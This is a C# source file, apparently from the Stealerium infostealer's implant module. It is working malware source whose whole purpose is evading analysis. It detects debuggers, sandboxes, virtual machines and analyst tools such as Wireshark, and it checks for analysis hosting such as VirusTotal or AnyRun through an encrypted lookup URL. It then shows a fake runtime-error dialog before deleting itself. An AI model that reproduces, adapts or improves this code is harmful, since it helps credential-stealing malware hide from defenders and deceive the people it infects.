using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Stealerium.Helpers;

namespace Stealerium.Modules.Implant
{
    internal sealed class AntiAnalysis
    {
        // CheckRemoteDebuggerPresent (Detect debugger)
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        // GetModuleHandle (Detect SandBox)
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        /// <summary>
        ///     Returns true if the file is running in debugger; otherwise returns false
        /// </summary>
        public static bool Debugger()
        {
            var isDebuggerPresent = false;
            try
            {
                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
                return isDebuggerPresent;
            }
            catch
            {
                // ignored
            }

            return isDebuggerPresent;
        }

        /// <summary>
        ///     Returns true if the file is running in emulator; otherwise returns false
        /// </summary>
        public static bool Emulator()
        {
            try
            {
                var ticks = DateTime.Now.Ticks;
                Thread.Sleep(10);
                if (DateTime.Now.Ticks - ticks < 10L)
                    return true;
            }
            catch
            {
                // ignored
            }

            return false;
        }

        /// <summary>
        ///     Returns true if the file is running on the server (VirusTotal, AnyRun); otherwise returns false
        /// </summary>
        public static bool Hosting()
        {
            try
            {
                var status = new WebClient()
                    .DownloadString(
                        StringsCrypt.Decrypt(new byte[]
                        {
                            145, 244, 154, 250, 238, 89, 238, 36, 197, 152, 49, 235, 197, 102, 94, 163, 45, 250, 10,
                            108, 175, 221, 139, 165, 121, 24, 120, 162, 117, 164, 206, 33, 157, 1, 101, 253, 223, 87,
                            30, 229, 249, 102, 235, 195, 201, 170, 140, 162
                        })); // http://ip-api.com/line/?fields=hosting
                return status.Contains("true");
            }
            catch
            {
                // ignored
            }

            return false;
        }

        /// <summary>
        ///     Returns true if a process is started from the list; otherwise, returns false
        /// </summary>
        public static bool Processes()
        {
            var runningProcessList = Process.GetProcesses();
            string[] selectedProcessList =
            {
                "processhacker",
                "netstat", "netmon", "tcpview", "wireshark",
                "filemon", "regmon", "cain"
            };
            return runningProcessList.Any(process => selectedProcessList.Contains(process.ProcessName.ToLower()));
        }

        /// <summary>
        ///     Returns true if the file is running in sandbox; otherwise returns false
        /// </summary>
        public static bool SandBox()
        {
            var dlls = new[]
            {
                "SbieDll",
                "SxIn",
                "Sf2",
                "snxhk",
                "cmdvrt32"
            };
            return dlls.Any(dll => GetModuleHandle(dll + ".dll").ToInt32() != 0);
        }

        /// <summary>
        ///     Returns true if the file is running in VirtualBox or VmWare; otherwise returns false
        /// </summary>
        public static bool VirtualBox()
        {
            using (var managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                try
                {
                    using (var managementObjectCollection = managementObjectSearcher.Get())
                    {
                        foreach (var managementBaseObject in managementObjectCollection)
                            if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" &&
                                 managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) ||
                                managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") ||
                                managementBaseObject["Model"].ToString() == "VirtualBox")
                                return true;
                    }
                }
                catch
                {
                    // ignored
                }
            }

            foreach (var managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2",
                         "SELECT * FROM Win32_VideoController").Get())
                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware")
                    && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
                    return true;

            return false;
        }

        /// <summary>
        ///     Detect virtual enviroment
        /// </summary>
        public static bool Run()
        {
            if (Config.AntiAnalysis != "1") return false;
            if (Hosting()) Logging.Log("AntiAnalysis : Hosting detected!");
            if (Processes()) Logging.Log("AntiAnalysis : Process detected!");
            if (VirtualBox()) Logging.Log("AntiAnalysis : Virtual machine detected!");
            if (SandBox()) Logging.Log("AntiAnalysis : SandBox detected!");
            //if (Emulator())  Logging.Log("AntiAnalysis : Emulator detected!", true);
            if (Debugger()) Logging.Log("AntiAnalysis : Debugger detected!");

            return false;
        }

        /// <summary>
        ///     Run fake error message and self destruct
        /// </summary>
        public static void FakeErrorMessage()
        {
            var code = StringsCrypt.GenerateRandomData("1");
            code = "0x" + code.Substring(0, 5);
            Logging.Log("Sending fake error message box with code: " + code);
            MessageBox.Show("Exit code " + code, "Runtime error",
                MessageBoxButtons.RetryCancel, MessageBoxIcon.Error);
            SelfDestruct.Melt();
        }
    }
}